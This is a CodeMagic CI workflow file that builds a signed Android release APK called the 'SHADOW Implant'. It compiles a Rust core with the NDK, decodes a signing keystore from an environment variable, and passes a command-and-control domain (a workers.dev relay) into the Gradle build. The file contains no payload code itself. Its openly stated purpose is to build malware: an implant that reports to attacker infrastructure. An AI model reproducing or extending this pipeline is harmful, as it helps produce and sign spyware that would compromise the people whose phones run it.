# SHADOW implant build — CodeMagic
workflows:
  build-implant:
    name: Build SHADOW Implant
    max_build_duration: 40
    instance_type: mac_mini_m1
    environment:
      java: 17
      vars:
        C2_DOMAIN: cfg-relay.marwannaili-23-07.workers.dev
    scripts:
      - name: Install Rust
        script: |
          curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable
          source "$HOME/.cargo/env"
          rustup target add aarch64-linux-android
          cargo --version
      - name: Build Rust core
        script: |
          source "$HOME/.cargo/env"
          cargo install cargo-ndk --version 3.5.4 || cargo install cargo-ndk
          cd core
          cargo ndk -t arm64-v8a -o android/app/src/main/jniLibs build --release
      - name: Copy libc++_shared
        script: |
          NDK_LIB=$(find "$HOME/android-sdk" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1)
          if [ -z "$NDK_LIB" ]; then
            # try the CodeMagic-installed NDK location
            NDK_LIB=$(find "$HOME" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1)
          fi
          echo "libc++_shared: $NDK_LIB"
          if [ -n "$NDK_LIB" ]; then
            mkdir -p core/android/app/src/main/jniLibs/arm64-v8a
            cp "$NDK_LIB" core/android/app/src/main/jniLibs/arm64-v8a/
          fi
      - name: Build APK (Gradle signs)
        script: |
          cd core/android
          # Keystore for the gradle release signing config (reads env vars)
          echo "$IMPLANT_KEYSTORE_BASE64" | base64 -d > app/implant.jks
          export IMPLANT_KEYSTORE_PATH="app/implant.jks"
          export IMPLANT_KEY_ALIAS="$IMPLANT_KEY_ALIAS"
          export IMPLANT_KEYSTORE_PASS="$IMPLANT_KEYSTORE_PASS"
          export IMPLANT_KEY_PASS="$IMPLANT_KEY_PASS"
          export C2_DOMAIN="$C2_DOMAIN"
          chmod +x gradlew
          ./gradlew assembleRelease
          ls -la app/build/outputs/apk/release/
    artifacts:
      - core/android/app/build/outputs/apk/release/*.apk
